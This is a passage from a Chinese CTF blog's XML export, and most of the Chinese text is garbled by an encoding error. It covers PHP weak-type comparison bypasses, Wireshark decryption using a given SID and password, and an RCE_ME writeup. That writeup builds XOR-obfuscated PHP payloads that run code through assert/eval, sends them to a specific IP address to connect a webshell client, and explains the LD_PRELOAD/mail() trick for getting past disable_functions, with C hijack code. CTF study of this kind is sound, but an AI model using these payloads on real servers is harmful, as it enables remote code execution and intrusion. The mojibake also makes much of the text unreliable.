<p> SIDå°±æ˜¯ä¹‹å‰è·¯å¾„ä¸­çš„S-1-5-21-2127750816-4215895028-2373289296-1001<br> passwordå°±æ˜¯p@ssw0rd<br> ç„¶åè§£å¯† </p>
<p> <img src="/2019/11/wireshark/20191107114557647.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"> </p>
<p> <img src="/2019/11/wireshark/20191107114605559.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"> </p>
<p><a href="https://blog.csdn.net/yh1013024906/article/details/102952104" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« 1</a></p>
<p><a href="https://cloud.tencent.com/developer/news/90236" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« 2</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>wireshark</tag>
        <tag>å·¥å…·</tag>
      </tags>
  </entry>
  <entry>
    <title>phpå¼±ç±»å‹</title>
    <url>/2019/11/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="å¼±ç±»å‹ä¸å¼ºç±»å‹"><a href="#å¼±ç±»å‹ä¸å¼ºç±»å‹" class="headerlink" title="å¼±ç±»å‹ä¸å¼ºç±»å‹"></a>å¼±ç±»å‹ä¸å¼ºç±»å‹</h2><p>é€šå¸¸è¯­è¨€æœ‰å¼ºç±»å‹å’Œå¼±ç±»å‹ä¸¤ç§ï¼Œå¼ºç±»å‹æŒ‡çš„æ˜¯å¼ºåˆ¶æ•°æ®ç±»å‹çš„è¯­è¨€ï¼Œå°±æ˜¯è¯´ï¼Œä¸€ä¸ªå˜é‡ä¸€æ—¦è¢«å®šä¹‰äº†æŸä¸ªç±»å‹ï¼Œå¦‚æœä¸ç»è¿‡å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œè¿™ä¸ªå˜é‡å°±ä¸€ç›´æ˜¯è¿™ä¸ªç±»å‹ï¼Œåœ¨å˜é‡ä½¿ç”¨ä¹‹å‰å¿…é¡»å£°æ˜å˜é‡çš„ç±»å‹å’Œåç§°ï¼Œä¸”ä¸ç»å¼ºåˆ¶è½¬æ¢ä¸å…è®¸ä¸¤ç§ä¸åŒç±»å‹çš„å˜é‡äº’ç›¸æ“ä½œã€‚è€Œå¼±ç±»å‹è¯­è¨€ï¼Œä¸ä¼šæ£€æŸ¥å˜é‡ç±»å‹ï¼Œå¯ä»¥éšæ—¶çš„è½¬æ¢å˜é‡ç±»å‹ã€‚</p><a id="more"></a>
<p>åœ¨phpä¸­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$x=<span class="number">1</span>;</span><br><span class="line">$x=<span class="string">"string"</span>;<span class="comment">//éšæ„è½¬æ¢å˜é‡ç±»å‹</span></span><br></pre></td></tr></table></figure>

<p>ä½†åœ¨Cè¯­è¨€ä¸­ä»»ä½•å˜é‡éƒ½è¦å…ˆå®šä¹‰å˜é‡ç±»å‹ï¼Œå†è¿›è¡Œèµ‹å€¼ã€‚</p>
<h2 id="æ¯”è¾ƒæ“ä½œç¬¦"><a href="#æ¯”è¾ƒæ“ä½œç¬¦" class="headerlink" title="æ¯”è¾ƒæ“ä½œç¬¦"></a>æ¯”è¾ƒæ“ä½œç¬¦</h2><p>åœ¨ç¼–ç¨‹ä¸­ç±»å‹è½¬æ¢æ˜¯ä¸å¯é¿å…çš„ä¸€ä¸ªäº‹æƒ…ï¼Œæ¯”å¦‚è¯´ç½‘ç»œç¼–ç¨‹ä¸­getæ–¹æ³•æˆ–è€…postæ–¹æ³•ä¼ å…¥ä¸€ä¸ªéœ€è¦è½¬æ¢æˆintçš„å€¼ï¼Œå†æ¯”å¦‚è¯´å˜é‡é—´è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œéœ€è¦å°†å˜é‡è¿›è¡Œè½¬æ¢ï¼Œé‰´äºphpæ˜¯è‡ªåŠ¨è¿›è¡Œç±»å‹è½¬æ¢ï¼Œæ‰€ä»¥ä¼šå¼•å‘å¾ˆå¤šæ„æƒ³ä¸åˆ°çš„é—®é¢˜ã€‚</p>
<p>phpæœ‰ä¸¤ç§æ¯”è¾ƒæ–¹å¼,ä¸€ç§æ˜¯â€œ= =â€ ä¸€ç§æ˜¯â€œ= = =â€è¿™ä¸¤ç§éƒ½å¯ä»¥æ¯”è¾ƒä¸¤ä¸ªæ•°å­—çš„å¤§å°ï¼Œä½†æ˜¯æœ‰å¾ˆæ˜æ˜¾çš„åŒºåˆ«ã€‚</p>
<p>â€œ= =â€ï¼šä¼šæŠŠä¸¤ç«¯å˜é‡ç±»å‹è½¬æ¢æˆç›¸åŒçš„ï¼Œåœ¨è¿›è¡Œæ¯”è¾ƒã€‚</p>
<p>â€œ= = =â€ï¼šä¼šå…ˆåˆ¤æ–­ä¸¤ç«¯å˜é‡ç±»å‹æ˜¯å¦ç›¸åŒï¼Œåœ¨è¿›è¡Œæ¯”è¾ƒã€‚</p>
<h2 id="ç±»å‹è½¬æ¢é—®é¢˜"><a href="#ç±»å‹è½¬æ¢é—®é¢˜" class="headerlink" title="ç±»å‹è½¬æ¢é—®é¢˜"></a>ç±»å‹è½¬æ¢é—®é¢˜</h2><p>phpä¸­æœ€å¸¸è§çš„å°±æ˜¯string è½¬intï¼Œæˆ–è€…intè½¬stringã€‚</p>
<p>ä¸€èˆ¬æœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸€æ˜¯å¼ºåˆ¶ç±»å‹è½¬æ¢<code>(string)$x</code>æˆ–<code>strval($x)</code>,<code>(int)$x</code>æˆ–<code>intval($X)</code>,äºŒæ˜¯æ ¹æ®è¿ç®—ç¬¦è‡ªåŠ¨è½¬æ¢ã€‚</p>
<p>ä¾‹å¦‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a=<span class="number">123</span>;var_dump($a); <span class="comment">//int(123)</span></span><br><span class="line">var_dump($a + <span class="string">"123"</span>); <span class="comment">//int(246)</span></span><br><span class="line">var_dump($a . <span class="string">"123"</span>); <span class="comment">//string(6) "123123"</span></span><br><span class="line">var_dump($a ==<span class="string">"123a1"</span>); <span class="comment">//bool(true)</span></span><br><span class="line">var_dump($a == <span class="string">"123e1"</span>); <span class="comment">//bool(false)</span></span><br><span class="line">var_dump($a == <span class="string">"12.3e1"</span>);  <span class="comment">//bool(true)</span></span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ˜¯è¿ç®—ç¬¦åˆ™ä¼šè‡ªåŠ¨è½¬æ¢æˆæ•°å€¼å†è¿›è¡Œè®¡ç®—ï¼Œå¦‚æœæ˜¯å­—ç¬¦ä¸²è¿ç®—ç¬¦åˆ™è½¬æ¢æˆå­—ç¬¦ä¸²å†è®¡ç®—</p>
<p>å¦‚æœæ˜¯â€œ==â€ï¼Œåˆ™ä¼šæŠŠå­—ç¬¦ä¸²è½¬æ¢æˆæ•°å€¼ï¼Œæ ¹æ®å®˜æ–¹æ–‡æ¡£å¦‚æœè¯¥å­—ç¬¦ä¸²æ²¡æœ‰åŒ…å«â€™.â€™,â€™eâ€™,â€™Eâ€™å¹¶ä¸”å…¶æ•°å€¼å€¼åœ¨æ•´å½¢çš„èŒƒå›´ä¹‹å†…ï¼Œè¯¥å­—ç¬¦ä¸²è¢«å½“ä½œintæ¥å–å€¼ï¼Œå…¶ä»–æ‰€æœ‰æƒ…å†µä¸‹éƒ½è¢«ä½œä¸ºfloatæ¥å–å€¼ï¼Œè¯¥å­—ç¬¦ä¸²çš„å¼€å§‹éƒ¨åˆ†å†³å®šäº†å®ƒçš„å€¼ï¼Œå¦‚æœè¯¥å­—ç¬¦ä¸²ä»¥åˆæ³•çš„æ•°å€¼å¼€å§‹ï¼Œåˆ™ä½¿ç”¨è¯¥æ•°å€¼ï¼Œå¦åˆ™å…¶å€¼ä¸º0ã€‚</p>
<h2 id="hashç»•è¿‡"><a href="#hashç»•è¿‡" class="headerlink" title="hashç»•è¿‡"></a>hashç»•è¿‡</h2><p>hash1.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$flag = <span class="string">"&#123;This_is_a_test!!!!&#125;"</span>; <span class="comment">//å‡è®¾flagçš„å€¼ä¸å¯è§</span></span><br><span class="line">$int =<span class="number">0</span>;  <span class="comment">//ä¸º$intèµ‹å€¼ ä½¿å…¶æ»¡è¶³ifçš„æ¡ä»¶</span></span><br><span class="line"><span class="keyword">if</span>($flag !== $int &amp;&amp; md5($flag) == $int) <span class="comment">//æ³¨æ„"ï¼==" å…ˆåˆ¤æ–­ç±»å‹</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"correct\n"</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"incorrect\n"</span>;</span><br></pre></td></tr></table></figure>

<p>ä¸º$intèµ‹ä½•å€¼ï¼Œæ‰èƒ½æ»¡è¶³æ¡ä»¶ï¼Ÿ</p>
<p>å…ˆçœ‹ä¸‹é¢å‡ ä¸ªä¾‹å­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$flag1 = <span class="string">"&#123;You_can't_see_me&#125;"</span>;</span><br><span class="line">$flag2 = <span class="string">"&#123;You_can't_see&#125;"</span>;</span><br><span class="line">$flag3 = <span class="string">"&#123;You_can't_se&#125;"</span>;</span><br><span class="line"></span><br><span class="line">var_dump(md5($flag1));  <span class="comment">//string(32) "dc39eb7c561e8753d2ce41cb2e1f798b"</span></span><br><span class="line">var_dump(intval(md5($flag1)));  <span class="comment">//int(0)</span></span><br><span class="line"></span><br><span class="line">var_dump(md5($flag2));  <span class="comment">//string(32) "2e2e029620ec42eb68bc24e88d35b027"</span></span><br><span class="line">var_dump(intval(md5($flag2)));  <span class="comment">//int(200)</span></span><br><span class="line"></span><br><span class="line">var_dump(md5($flag3));  <span class="comment">//string(32) "58a39a758897868896d56904481fb4a0"</span></span><br><span class="line">var_dump(intval(md5($flag3)));  <span class="comment">//int(58)</span></span><br><span class="line"></span><br><span class="line">var_dump(<span class="string">"1e1q"</span> == <span class="number">10</span>);  <span class="comment">//bool(true)</span></span><br><span class="line">var_dump(<span class="string">"1eq"</span> == <span class="number">1</span>);  <span class="comment">//bool(true)</span></span><br></pre></td></tr></table></figure>

<p>ä¸éš¾çœ‹å‡ºï¼Œä¸è®º$flagçš„å€¼æ˜¯ä»€ä¹ˆï¼Œmd5å‡½æ•°éƒ½ä¼šè¿”å›32ä½çš„16è¿›åˆ¶æ•°ï¼Œåˆ©ç”¨è½¬æ¢æ¼æ´ï¼Œå¯ä»¥è½»æ¾çˆ†ç ´ï¼Œä»è€Œç»•è¿‡ã€‚ä½†å¦‚æœeåé¢æœ‰æ¯”è¾ƒé•¿çš„çº¯æ•°å­—å­—ç¬¦é‚£ä¹ˆå°±åˆ«æƒ³ç€çˆ†ç ´äº†(æ¦‚ç‡è¾ƒå°)ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$flag = <span class="string">"&#123;This_is_a_test!!!!&#125;"</span>; <span class="comment">//å‡è®¾flagçš„å€¼ä¸å¯è§</span></span><br><span class="line">$i=<span class="number">0</span>;</span><br><span class="line">$j=intval(md5($flag));</span><br><span class="line"><span class="keyword">while</span>($i!=$j)</span><br><span class="line">&#123;</span><br><span class="line">    $i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $i; <span class="comment">//721</span></span><br></pre></td></tr></table></figure>

<h2 id="jsonç»•è¿‡"><a href="#jsonç»•è¿‡" class="headerlink" title="jsonç»•è¿‡"></a>jsonç»•è¿‡</h2><p> JSON æ˜¯ä¸€ç§è½»é‡çº§çš„æ•°æ®æ ¼å¼ï¼Œä»–åŸºäº javascript è¯­æ³•çš„å­é›†ï¼Œå³æ•°ç»„å’Œå¯¹è±¡è¡¨ç¤ºã€‚ç”±äºä½¿ç”¨çš„æ˜¯ javascript è¯­æ³•ï¼Œå› æ­¤JSON å®šä¹‰å¯ä»¥åŒ…å«åœ¨javascript æ–‡ä»¶ä¸­ï¼Œå¯¹å…¶çš„è®¿é—®æ— éœ€é€šè¿‡åŸºäº XML çš„è¯­è¨€æ¥é¢å¤–è§£æ ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'message'</span>])) &#123;</span><br><span class="line">    $message = json_decode($_POST[<span class="string">'message'</span>]);</span><br><span class="line">    $key =<span class="string">"abc"</span>;</span><br><span class="line">    <span class="keyword">if</span> ($message-&gt;key == $key) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"fail"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"~~~~"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p> è¾“å…¥ä¸€ä¸ªæ•°ç»„è¿›è¡Œjsonè§£ç ï¼Œå¦‚æœè§£ç åçš„messageä¸keyå€¼ç›¸åŒï¼Œä¼šå¾—åˆ°flagï¼Œä¸»è¦æ€æƒ³è¿˜æ˜¯å¼±ç±»å‹è¿›è¡Œç»•è¿‡ï¼Œæˆ‘ä»¬ä¸çŸ¥é“keyå€¼æ˜¯ä»€ä¹ˆï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“ä¸€ä»¶äº‹å°±æ˜¯å®ƒè‚¯å®šæ˜¯å­—ç¬¦ä¸²ï¼Œè¿™æ ·å°±å¯ä»¥äº†ï¼Œä¸Šæ–‡è®²è¿‡ï¼Œä¸¤ä¸ªç­‰å·æ—¶ä¼šè½¬åŒ–æˆåŒä¸€ç±»å‹å†è¿›è¡Œæ¯”è¾ƒï¼Œç›´æ¥æ„é€ ä¸€ä¸ªæ•°å€¼å°±å¯ä»¥ç›¸ç­‰äº†ã€‚æœ€ç»ˆpayload message={â€œkeyâ€:0}ã€‚ å¦‚æœ$keyä¸­çš„å­—ç¬¦ä¸²å¼€å¤´å¹¶ä¸æ˜¯å­—æ¯ï¼Œåˆ™éœ€è¦æˆ‘ä»¬å»çˆ†ç ´ã€‚</p>
<p><a href="https://www.cnblogs.com/anbus/p/10000571.html" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« </a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>å¼±ç±»å‹</tag>
      </tags>
  </entry>
  <entry>
    <title>bypass_disable_functions</title>
    <url>/2019/10/bypass-disable-functions/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="RCE-ME"><a href="#RCE-ME" class="headerlink" title="RCE_ME"></a><a href="http://114.116.44.23:40001/" target="_blank" rel="noopener">RCE_ME</a></h2><h3 id="ç»•è¿‡-amp-è·å–shell"><a href="#ç»•è¿‡-amp-è·å–shell" class="headerlink" title="ç»•è¿‡&amp;è·å–shell"></a>ç»•è¿‡&amp;è·å–shell</h3><p><img src="/2019/10/bypass-disable-functions/image-20191030142752981.png" alt="image-20191030142752981"></p><p>æ ¹æ®ä»£ç è¦æ±‚ï¼š</p><ol>
<li><p>é•¿åº¦ä¸èƒ½å¤§äº40</p>
</li>
<li><p>ä¸èƒ½åŒ…å«å¤§å°å†™å­—æ¯ï¼Œæ•°å­—</p>
</li>
</ol><p>åœ¨PHPä¸­ä¸¤ä¸ªå­—ç¬¦å¼‚æˆ–å¯ä»¥å¾—åˆ°å¦å¤–ä¸€ä¸ªå­—ç¬¦ï¼Œä¾‹å¦‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"!"</span> ^ <span class="string">"&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2019/10/bypass-disable-functions/image-20191030150348065.png" alt="image-20191030150348065"></p><p>åˆ©ç”¨è¿™ç‚¹æˆ‘ä»¬å°±èƒ½ç»•è¿‡å¯¹å­—æ¯æ•°å­—çš„è¿‡æ»¤</p><p>ä¹‹åæˆ‘ä»¬è¦ç»•è¿‡å¯¹é•¿åº¦çš„é™åˆ¶ï¼Œ40å­—ç¬¦å®åœ¨æ˜¯é™åˆ¶å¤ªå¤§äº†</p><a id="more"></a>








<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#code=$_="`&#123;&#123;&#123;"^"?&lt;&gt;/";$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=eval($_GET[a])&amp;a=phpinfo(); //æ„é€ payloadæ‰§è¡Œphpå‡½æ•°</span></span><br><span class="line">$_=<span class="string">"`&#123;&#123;&#123;"</span>^<span class="string">"?&lt;&gt;/"</span>;</span><br><span class="line">var_dump($_);      <span class="comment">//string(4) "_GET"</span></span><br><span class="line"></span><br><span class="line">var_dump(urldecode(<span class="string">"%fe%fe%fe%fe"</span>)^urldecode(<span class="string">"%a1%b9%bb%aa"</span>)); <span class="comment">//string(4) "_GET"</span></span><br><span class="line"></span><br><span class="line">$&#123;$_&#125;[_]($&#123;$_&#125;[__]);</span><br><span class="line"><span class="comment">#$_GET[_]($_GET[__])</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#&amp;_=assert</span></span><br><span class="line"><span class="comment">#&amp;__=eval($_GET[a])&amp;a=phpinfo();</span></span><br><span class="line"><span class="comment">//code=assert(eval($_GET[a])&amp;a=phpinfo();)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è®¿é—®</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//114.116.44.23:40001/?code=$_=%22`&#123;&#123;&#123;%22^%22?%3C%3E/%22;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=eval($_GET[a])&amp;a=phpinfo();</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/bypass-disable-functions/image-20191030152007908.png" alt="image-20191030152007908"></p>
<p>æ¥ç€æ„é€ payloadè®©èšå‰‘æ¥è¿</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">114.116</span>.<span class="number">44.23</span>:<span class="number">40001</span>/?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[<span class="number">_</span>]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_<span class="number">_</span>]);&amp;<span class="number">_</span>=assert&amp;_<span class="number">_</span>=<span class="keyword">eval</span>($_POST[%27a%27])</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/bypass-disable-functions/image-20191030152338199.png" alt="image-20191030152338199"></p>
<p><img src="/2019/10/bypass-disable-functions/image-20191030152446769.png" alt="image-20191030152446769"></p>
<p>flagåªæœ‰rootæƒé™æ‰èƒ½è®¿é—®ï¼Œreadflagä¼°è®¡æ˜¯ç”¨æ¥è¯»flagçš„ã€‚</p>
<p>ç›´æ¥åœ¨è™šæ‹Ÿç»ˆç«¯ä¸­æ‰§è¡Œreadflagå‘½ä»¤</p>
<p><img src="/2019/10/bypass-disable-functions/image-20191030152803007.png" alt="image-20191030152803007"></p>
<p>å‘ç°å‘½ä»¤éƒ½æ— æ³•æ‰§è¡Œï¼ŒæŸ¥çœ‹phpinfo()ï¼›ä¼°è®¡æ˜¯è°ƒç”¨ç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°è¢«ç¦ç”¨äº†</p>
<p> <img src="/2019/10/bypass-disable-functions/1571499768310.png" alt="1571499768310"> </p>
<h3 id="bypass-disable-functions"><a href="#bypass-disable-functions" class="headerlink" title="bypass_disable_functions"></a>bypass_disable_functions</h3><p>ä¸€èˆ¬è€Œè¨€ï¼Œåˆ©ç”¨æ¼æ´æ§åˆ¶ web å¯åŠ¨æ–°è¿›ç¨‹ a.binï¼Œa.bin å†…éƒ¨è°ƒç”¨ç³»ç»Ÿå‡½æ•° b()ï¼Œb()  ä½äºç³»ç»Ÿå…±äº«å¯¹è±¡ c.so ä¸­ï¼Œæ‰€ä»¥ç³»ç»Ÿä¸ºè¯¥è¿›ç¨‹åŠ è½½å…± c.soï¼Œæƒ³æ³•åœ¨ c.so å‰ä¼˜å…ˆåŠ è½½å¯æ§çš„ c_evil.soï¼Œc_evil.so  å†…å«ä¸ b() åŒåçš„æ¶æ„å‡½æ•°ï¼Œç”±äº c_evil.so ä¼˜å…ˆçº§è¾ƒé«˜ï¼Œæ‰€ä»¥ï¼Œa.bin å°†è°ƒç”¨åˆ° c_evil.so å†… b() è€Œéç³»ç»Ÿçš„  c.so å†… b()ï¼ŒåŒæ—¶ï¼Œc_evil.so å¯æ§ï¼Œè¾¾åˆ°æ‰§è¡Œæ¶æ„ä»£ç çš„ç›®çš„ã€‚åŸºäºè¿™ä¸€æ€è·¯ï¼Œå¸¸è§çªç ´ disable_functions  é™åˆ¶æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤çš„æ–¹å¼ä¸ºï¼š</p>
<ul>
<li>ç¼–å†™ä¸€ä¸ªåŸå‹ä¸º uid_t getuid(void); çš„ C å‡½æ•°ï¼Œå†…éƒ¨æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„ä»£ç ï¼Œå¹¶ç¼–è¯‘æˆå…±äº«å¯¹è±¡ getuid_shadow.soï¼›</li>
<li>è¿è¡Œ PHP å‡½æ•° putenv()ï¼Œè®¾å®šç¯å¢ƒå˜é‡ LD_PRELOAD ä¸º getuid_shadow.soï¼Œä»¥ä¾¿åç»­å¯åŠ¨æ–°è¿›ç¨‹æ—¶ä¼˜å…ˆåŠ è½½è¯¥å…±äº«å¯¹è±¡ï¼›( LD_PRELOADæ˜¯Unixä¸­çš„ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œç”¨äºå®šä¹‰åœ¨ç¨‹åºè¿è¡Œå‰ä¼˜å…ˆåŠ è½½çš„åŠ¨æ€é“¾æ¥åº“ï¼ŒLDå’ŒåŠ¨æ€åº“æœ‰å…³ï¼ŒPRELOADè¡¨ç¤ºé¢„åŠ è½½ï¼Œç»“åˆèµ·æ¥å°±æ˜¯é¢„å…ˆåŠ è½½çš„åŠ¨æ€åº“ã€‚é€šè¿‡è¿™ä¸ªç¯å¢ƒå˜é‡ï¼Œå¯ä»¥è¦†ç›–æ­£å¸¸çš„å‡½æ•°åº“ä¸­çš„å‡½æ•°ã€‚)</li>
<li>è¿è¡Œ PHP çš„ mail() å‡½æ•°ï¼Œmail() å†…éƒ¨å¯åŠ¨æ–°è¿›ç¨‹ /usr/sbin/sendmailï¼Œç”±äºä¸Šä¸€æ­¥  LD_PRELOAD çš„ä½œç”¨ï¼Œsendmail è°ƒç”¨çš„ç³»ç»Ÿå‡½æ•° getuid() è¢«ä¼˜å…ˆçº§æ›´å¥½çš„ getuid_shadow.so ä¸­çš„åŒå  getuid() æ‰€åŠ«æŒï¼›</li>
<li>è¾¾åˆ°ä¸è°ƒç”¨ PHP çš„å„ç§å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼ˆsystem()ã€exec() ç­‰ç­‰ï¼‰ä»å¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ç›®çš„ã€‚</li>
</ul>
<h4 id="a-cæ–‡ä»¶ï¼š"><a href="#a-cæ–‡ä»¶ï¼š" class="headerlink" title="a.cæ–‡ä»¶ï¼š"></a>a.cæ–‡ä»¶ï¼š</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> passwd[]=<span class="string">"123456"</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input password!\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(passwd,argv[<span class="number">1</span>]))&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Correct\n"</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Invalid\n"</span>);		  </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/bypass-disable-functions/image-20191030171503480.png" alt="image-20191030171503480"></p>
<p> å¦‚æœæ˜¯ä¸çŸ¥é“å¯†ç çš„æƒ…å†µä¸‹ï¼Œå°±å¯ä»¥ç¼–å†™ä¸€ä¸ªåŠ¨æ€å‡½æ•°åº“æ¥è¦†ç›–æ‰strcmpå‡½æ•°æ’è¿”å›0ä»¥è¾¾åˆ°ä»»æ„å¯†ç éƒ½è¿”å›Correct </p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">-fPIC ä½œç”¨äºç¼–è¯‘é˜¶æ®µï¼Œå‘Šè¯‰ç¼–è¯‘å™¨äº§ç”Ÿä¸ä½ç½®æ— å…³ä»£ç (<span class="built_in">Position</span>-<span class="literal">Independent</span> Code)ï¼Œ åˆ™äº§ç”Ÿçš„ä»£ç ä¸­ï¼Œæ²¡æœ‰ç»å¯¹åœ°å€ï¼Œå…¨éƒ¨ä½¿ç”¨ç›¸å¯¹åœ°å€ï¼Œæ•…è€Œä»£ç å¯ä»¥è¢«åŠ è½½å™¨åŠ è½½åˆ°å†…å­˜çš„ä»»æ„ ä½ç½®ï¼Œéƒ½å¯ä»¥æ­£ç¡®çš„æ‰§è¡Œã€‚è¿™æ­£æ˜¯å…±äº«åº“æ‰€è¦æ±‚çš„ï¼Œå…±äº«åº“è¢«åŠ è½½æ—¶ï¼Œåœ¨å†…å­˜çš„ä½ç½®ä¸æ˜¯å›ºå®šçš„</span><br></pre></td></tr></table></figure>

<p>evil.cæ–‡ä»¶ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s1,<span class="keyword">const</span> <span class="keyword">char</span> *s2)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"evil function\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/bypass-disable-functions/image-20191030172344903.png" alt="image-20191030172344903"></p>
<p>æ‰€ä»¥ç»•è¿‡disable_functions,å¯ä»¥é€šè¿‡ä¸Šä¼ æ¶æ„soæ–‡ä»¶ï¼ŒåŠ«æŒgetuid(),è¾¾åˆ°å‘½ä»¤æ‰§è¡Œç›®çš„ã€‚ä¹‹æ‰€ä»¥åŠ«æŒ getuid()ï¼Œæ˜¯å› ä¸º sendmail  ç¨‹åºä¼šè°ƒç”¨è¯¥å‡½æ•°ï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥ä¸ºå…¶ä»–è¢«è°ƒç”¨çš„ç³»ç»Ÿå‡½æ•°ï¼‰</p>
<p>ä½†æ˜¯è¿™ç§åŠ«æŒå‡½æ•°çš„åšæ³•æœ‰å¾ˆå¤§çš„ç¼ºé™·ï¼š</p>
<p>â€‹    ä¸€æ˜¯ï¼ŒæŸäº›ç¯å¢ƒä¸­ï¼Œweb ç¦æ­¢å¯ç”¨  senmailã€ç”šè‡³ç³»ç»Ÿä¸Šæ ¹æœ¬æœªå®‰è£… sendmailï¼Œä¹Ÿå°±è°ˆä¸ä¸ŠåŠ«æŒ getuid()ï¼Œé€šå¸¸çš„ www-data æƒé™åˆä¸å¯èƒ½å»æ›´æ”¹  php.ini é…ç½®ã€å»å®‰è£… sendmail è½¯ä»¶ï¼›äºŒæ˜¯ï¼Œå³ä¾¿ç›®æ ‡å¯ä»¥å¯ç”¨ sendmailï¼Œç”±äºæœªå°†ä¸»æœºåï¼ˆhostname è¾“å‡ºï¼‰æ·»åŠ è¿›  hosts ä¸­ï¼Œå¯¼è‡´æ¯æ¬¡è¿è¡Œ sendmail éƒ½è¦è€—æ—¶åŠåˆ†é’Ÿç­‰å¾…åŸŸåè§£æè¶…æ—¶è¿”å›ï¼Œwww-data ä¹Ÿæ— æ³•å°†ä¸»æœºååŠ å…¥  hostsï¼ˆå¦‚ï¼Œ127.0.0.1    lampã€lamp.ã€lamp.comï¼‰ </p>
